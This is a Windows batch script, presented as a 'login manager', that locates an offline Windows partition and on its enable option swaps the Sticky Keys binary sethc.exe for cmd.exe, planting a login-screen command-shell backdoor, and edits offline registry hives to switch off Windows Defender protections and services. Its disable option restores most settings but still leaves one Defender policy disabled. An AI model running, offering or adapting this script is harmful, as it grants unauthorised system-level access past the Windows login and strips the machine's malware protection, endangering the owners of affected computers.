@ echo off

FOR %%w IN (C D E F G H I J K L N M O P Q R S T U V W X Y Z) DO IF EXIST %%w:\PerfLogs set SYSPART=%%w:
echo "%SYSPART%"

if "%SYSPART%"=="" (
    echo "No Windows installations detected!"
    echo "Maybe you windows is encrypted?"
    pause
    exit
) else (
    echo %SYSPART%
)

:MAINMENU
SET MENU=
ECHO WINDOWS LOGIN MANAGER
echo.
ECHO [1] Enable admin on login page
ECHO [2] Disabling admin on login page
echo.
SET /P MENU=Type 1, 2 or 0 then press ENTER :
IF /I '%MENU%'=='1' GOTO :ENABLE
IF /I '%MENU%'=='2' GOTO :DISABLE
GOTO :MAINMENU

:ENABLE
copy /y "sticky_run.bat" "%SYSPART%\windows\system32"
copy /y "sticky.bat" "%SYSPART%\windows\system32"
move "%SYSPART%\windows\system32\sethc.exe" "%SYSPART%\windows\system32\sethc.exe.bak"
copy /y "%SYSPART%\windows\system32\cmd.exe" "%SYSPART%\windows\system32\sethc.exe"

rem disable defender
reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SOFTWARE"
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg unload "HKLM\temp-hive"

reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SYSTEM"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
reg unload "HKLM\temp-hive"

echo "Completed"
pause
exit

:DISABLE
del "%SYSPART%\windows\system32\sticky_run.bat"
del "%SYSPART%\windows\system32\sticky.bat"
move /y "%SYSPART%\windows\system32\sethc.exe.bak" "%SYSPART%\windows\system32\sethc.exe"

rem enable defender
reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SOFTWARE"
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0 /f
reg unload "HKLM\temp-hive"

reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SYSTEM"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 2 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 2 /f
reg unload "HKLM\temp-hive"

echo "Completed"
pause
exit